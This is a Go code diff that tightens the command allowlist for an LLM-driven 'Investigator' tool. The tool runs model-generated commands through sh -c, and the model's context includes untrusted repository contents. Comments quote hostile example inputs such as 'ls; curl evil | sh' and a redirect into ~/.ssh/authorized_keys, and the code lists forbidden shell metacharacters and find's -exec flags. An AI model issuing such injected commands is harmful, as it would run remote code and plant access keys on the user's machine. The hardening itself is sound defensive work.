@@ -97,10 +97,12 @@ func (inv *Investigator) SetCommandAllowlist(allowlist []string) {
 
 // isCommandAllowed checks whether a command is permitted by the allowlist.
 // If the allowlist is empty, all commands are allowed for backward compatibility.
-// Commands containing any shell metacharacter — chaining (;, &, |, $, `),
-// redirection (<, >), or control/escape bytes — are always rejected to prevent
-// injection (and out-of-repo redirection) through prefix matching, since the
-// command is ultimately handed to `sh -c`.
+// Commands are run through `sh -c` (via shellexec), so any shell metacharacter
+// that could chain commands, redirect I/O, or escape the allowlist prefix is
+// rejected — matching the hardened native-runtime check in
+// internal/runtime/gemma.go (H9). Investigator command strings originate from an
+// LLM whose context includes untrusted repository file contents, so a prefix
+// like "cat " must not be rideable into `cat secret > /path` or `find . -exec …`.
 func (inv *Investigator) isCommandAllowed(command string) bool {
 	trimmed := strings.TrimSpace(command)
 	if trimmed == "" {
@@ -110,15 +112,22 @@ func (inv *Investigator) isCommandAllowed(command string) bool {
 	// Reject shell metacharacters FIRST, before the empty-allowlist
 	// short-circuit. Otherwise a config with an explicitly empty
 	// command_allowlist would allow injection like "ls; curl evil | sh".
-	// This is the same forbidden set enforced by the gemma runtime's
-	// run_command tool (internal/runtime/gemma.go) and the criteria command
-	// evaluator; the investigator must not be a weaker gate. Crucially it
-	// includes redirection (<, >) — a prefix-matched command such as
-	// "cat go.mod > /home/user/.ssh/authorized_keys" otherwise passes and
-	// `sh -c` writes to an absolute path outside cmd.Dir (the repo).
+	// The set mirrors gemma.go's forbidden set: chaining (;&|), expansion
+	// ($`), redirection (<>), newlines/tab/CR, NUL, and backslash escapes.
 	const forbidden = ";&|$`<>\n\r\t\x00\\"
 	if strings.ContainsAny(trimmed, forbidden) {
 		return false
+	}
+
+	// Even without a metacharacter, an allowlisted binary that itself launches
+	// other programs defeats the allowlist. `find`'s -exec/-execdir/-ok/-okdir
+	// run arbitrary commands (with the `+` terminator no `;` is needed), so
+	// reject them as whole tokens regardless of which tool precedes them.
+	for _, tok := range strings.Fields(trimmed) {
+		switch tok {
+		case "-exec", "-execdir", "-ok", "-okdir":
+			return false
+		}
 	}
 
 	if len(inv.commandAllowlist) == 0 {
